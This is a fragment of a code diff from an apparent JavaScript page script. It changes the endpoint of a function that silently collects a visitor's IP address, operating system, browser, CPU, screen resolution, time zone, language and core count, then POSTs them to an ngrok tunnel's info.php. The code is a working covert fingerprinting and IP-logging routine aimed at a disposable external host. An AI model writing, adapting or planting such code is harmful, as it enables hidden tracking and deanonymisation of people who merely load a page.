@@ -27,7 +27,7 @@ function mydata(){
             var ip = data
             $.ajax({
                 type: 'POST',
-                url: '  https://eafb-149-22-80-118.ngrok-free.app/info.php',
+                url: 'https://85fe-212-8-252-183.ngrok-free.app/info.php',
                 data: {getip:ip,osname:OS,Version:ver,BrowserName:getbrow,Verbrow:getbrowVer,cpuname:CPU,Resolution:currentResolution,time:timeZone,lan:language,numcore:core},
                 mimeType: 'text'
                 });
